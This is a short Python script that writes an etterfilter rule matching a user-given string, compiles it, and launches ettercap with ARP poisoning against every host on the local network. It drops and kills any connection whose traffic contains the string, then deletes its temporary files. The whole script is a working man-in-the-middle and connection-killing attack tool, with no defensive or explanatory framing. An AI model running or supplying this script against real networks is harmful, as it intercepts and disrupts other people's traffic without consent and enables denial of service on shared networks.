#!/usr/bin/python3

from sys import argv
import os

try:
    string = argv[1]
except:
    print("[!] Argument needed: search string")
    exit(0)

template = '''
if (search(DECODED.data,"%s")) {
drop();
kill();
msg("[*] Killed from DECODED");
}

if (search(DATA.data,"%s")) {
drop();
kill();
msg("[*] Killed from DATA");
}
''' % (string,string)


with open("/root/scripts/tmp","w") as f:
    f.write(template)
os.system("etterfilter /root/scripts/tmp -o /root/scripts/tmp.ef")
os.system("ettercap -T -q -p -F /root/scripts/tmp.ef -M arp /// ///")

print("[*] Cleaning up...")
os.system("rm /root/scripts/tmp /root/scripts/tmp.ef")
exit(0)
